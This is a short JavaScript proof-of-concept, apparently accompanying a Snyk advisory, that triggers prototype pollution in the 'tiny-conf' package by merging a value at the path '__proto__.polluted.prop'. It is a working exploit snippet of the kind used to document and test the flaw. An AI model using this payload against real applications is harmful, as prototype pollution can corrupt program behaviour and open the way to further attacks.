//https://snyk.io/vuln/SNYK-JS-TINYCONF-598792
const tinyConf = require('tiny-conf'); 
let val = {prop: "yes"};
val.toString = () => "yes";
tinyConf.merge('__proto__.polluted.prop', val); 
  